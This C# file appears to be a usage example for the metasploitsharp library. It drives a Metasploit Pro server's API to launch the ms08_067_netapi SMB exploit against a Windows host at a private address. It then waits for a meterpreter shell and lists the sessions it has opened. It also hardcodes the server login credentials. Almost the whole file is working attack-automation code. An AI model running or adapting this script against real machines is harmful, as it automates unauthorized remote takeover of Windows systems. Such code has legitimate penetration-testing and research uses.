using System;
using metasploitsharp;
using System.Collections.Generic;

namespace ModuleExecuteExample
{
	class MainClass
	{
		public static void Main (string[] args)
		{
			using (MetasploitSession session = new MetasploitSession("metasploit", "P@ssw0rd!", "https://192.168.1.5:3790/api/1.1"))
			{
				if (string.IsNullOrEmpty(session.Token))
					throw new Exception("Login failed. Check credentials");
				
				using (MetasploitProManager manager = new MetasploitProManager(session))
				{
//					Dictionary<string, object> options = new Dictionary<string, object>();
//					options.Add("RHOST", "192.168.1.129");
//					options.Add("RPORT", "445");
//					options.Add("LPORT", new Random().Next(1001, 50000));
//					
//					Dictionary<string, object> response = manager.ExecuteModule("exploit", "windows/smb/ms08_067_netapi", options);
//					
//					foreach (KeyValuePair<string, object> pair in response)
//						Console.WriteLine(pair.Key + ": " + pair.Value);
				
					var response = manager.CreateConsole();
					
					foreach (var pair in response)
						Console.WriteLine(pair.Key + ": " + pair.Value);
					
					string consoleID = response["id"] as string;
					
					Console.WriteLine("Setting up options...");
					
					response = manager.WriteToConsole(consoleID, "use exploit/windows/smb/ms08_067_netapi\n");
					System.Threading.Thread.Sleep(6000);
					response = manager.WriteToConsole(consoleID, "set RHOST 192.168.1.129\n");
					System.Threading.Thread.Sleep(6000);
					response = manager.WriteToConsole(consoleID, "set LPORT " + new Random().Next(1001, 50000) + "\n");
					System.Threading.Thread.Sleep(6000);
					
					Console.WriteLine("Exploiting...");
					
					response = manager.WriteToConsole(consoleID, "exploit\n");
					System.Threading.Thread.Sleep(12000);
					
					bool busy = true;
					
					while (busy)
					{
						response = manager.ReadConsole(consoleID);
						
						foreach (var pair in response)
							Console.WriteLine(pair.Key + ": " + pair.Value);
					
						busy = bool.Parse(response["busy"].ToString());
						
						if ((response["prompt"] as string).Contains("meterpreter"))
							break;
					}
					
					response = manager.ListSessions();
					
					foreach (var pair in response)
						foreach (var p in pair.Value as Dictionary<string, object>)
							Console.WriteLine(p.Key + ": "  + p.Value);
					
					manager.DestroyConsole(consoleID);
				}
			}
		}
	}
}
